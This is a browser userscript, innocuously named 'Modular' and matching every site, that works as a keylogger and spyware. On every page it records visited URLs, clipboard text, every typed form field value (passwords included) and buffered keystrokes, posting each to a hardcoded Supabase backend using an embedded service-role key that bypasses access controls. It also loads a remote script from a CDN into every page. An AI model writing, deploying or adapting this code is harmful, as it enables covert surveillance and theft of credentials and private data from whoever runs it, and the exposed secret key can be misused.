// ==UserScript==
// @name         Modular 
// @namespace    http://your.namespace
// @version      1.0.0
// @description  Modular
// @match        *://*/*
// @grant        none
// @run-at       document-end
// ==/UserScript==

(async function () {
  const config = {
    enableUrlLogging: true,
    enableClipboardLogging: true,
    enableFormLogging: true,
    enableKeystrokeLogging: true
  };

  const SUPABASE_URL = 'https://rjejpdzlnzuffrqwpziw.supabase.co';
  const SUPABASE_API_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InJqZWpwZHpsbnp1ZmZycXdweml3Iiwicm9sZSI6InNlcnZpY2Vfcm9sZSIsImlhdCI6MTc0OTQ5ODgyNywiZXhwIjoyMDY1MDc0ODI3fQ.XbG3PzUGxFpvDv3sNvHPvqhtACBhKWU_Ny73FXK7DJA'; // Service role key (bypasses RLS)
  const USER_ID = '3530a193-6219-4bb7-b20b-ab80c54ddb3e'; // UUID for your test user

  const HEADERS = {
    'apikey': SUPABASE_API_KEY,
    'Authorization': `Bearer ${SUPABASE_API_KEY}`,
    'Content-Type': 'application/json',
    'Prefer': 'return=minimal'
  };

  const getNow = () => new Date().toISOString();
  const fullUrl = location.href;
  const baseUrl = location.hostname;
  const pageTitle = document.title;

  /** -------------------- INIT --------------------- **/
  injectConsole();

  if (config.enableUrlLogging) await logPageVisit();
  if (config.enableClipboardLogging) setupClipboardListener();
  if (config.enableFormLogging) setupFormListener();
  if (config.enableKeystrokeLogging) setupKeystrokeLogger();

  /** -------------------- CONSOLE --------------------- **/
  function injectConsole() {
    const s = document.createElement('script');
    s.src = 'https://cdn.jsdelivr.net/npm/eruda';
    s.onload = () => eruda.init();
    document.body.appendChild(s);
  }

  /** -------------------- URL Logger --------------------- **/
  async function logPageVisit() {
    const data = {
      user_id: USER_ID,
      full_url: fullUrl,
      base_url: baseUrl,
      page_title: pageTitle,
      timestamp: getNow()
    };
    console.log('📤 Logging URL:', data);
    try {
      await fetch(`${SUPABASE_URL}/rest/v1/url_history`, {
        method: 'POST',
        headers: HEADERS,
        body: JSON.stringify(data)
      });
    } catch (e) {
      console.error('❌ Failed to log URL:', e);
    }
  }

  /** -------------------- Clipboard Logger --------------------- **/
  function setupClipboardListener() {
    document.addEventListener('copy', async () => {
      try {
        const clipboardText = await navigator.clipboard.readText();
        if (!clipboardText) return;
        const data = {
          user_id: USER_ID,
          clipboard_data: clipboardText,
          full_url: fullUrl,
          timestamp: getNow()
        };
        console.log('📤 Logging Clipboard:', data);
        await fetch(`${SUPABASE_URL}/rest/v1/clipboard`, {
          method: 'POST',
          headers: HEADERS,
          body: JSON.stringify(data)
        });
      } catch (e) {
        console.error('❌ Clipboard log failed:', e);
      }
    });
  }

  /** -------------------- Form Input Logger --------------------- **/
  function setupFormListener() {
    document.addEventListener('input', async (e) => {
      const el = e.target;
      if (!el || !(el.tagName === 'INPUT' || el.tagName === 'TEXTAREA')) return;
      const data = {
        user_id: USER_ID,
        field_name: el.name || el.id || 'unknown',
        field_value: el.value,
        full_url: fullUrl,
        timestamp: getNow()
      };
      console.log('📤 Logging Form Input:', data);
      try {
        await fetch(`${SUPABASE_URL}/rest/v1/form_inputs`, {
          method: 'POST',
          headers: HEADERS,
          body: JSON.stringify(data)
        });
      } catch (e) {
        console.error('❌ Form log failed:', e);
      }
    });
  }

  /** -------------------- Keystroke Logger --------------------- **/
  function setupKeystrokeLogger() {
    let buffer = '';
    let lastKeyTime = Date.now();
    let timer = null;

    const FLUSH_DELAY = 10000;

    function flushKeystrokes() {
      if (!buffer) return;
      const data = {
        user_id: USER_ID,
        keys: buffer,
        full_url: fullUrl,
        timestamp: getNow()
      };
      console.log('📤 Logging Keystrokes:', data);
      fetch(`${SUPABASE_URL}/rest/v1/keystrokes`, {
        method: 'POST',
        headers: HEADERS,
        body: JSON.stringify(data)
      }).catch(console.error);
      buffer = '';
    }

    function resetTimer() {
      if (timer) clearTimeout(timer);
      timer = setTimeout(() => {
        if (Date.now() - lastKeyTime >= FLUSH_DELAY) {
          flushKeystrokes();
        }
      }, FLUSH_DELAY);
    }

    document.addEventListener('keydown', (e) => {
      if (e.key.length === 1) {
        buffer += e.key;
        lastKeyTime = Date.now();
        resetTimer();
      }
    });

    window.addEventListener('beforeunload', () => {
      flushKeystrokes();
    });
  }
})();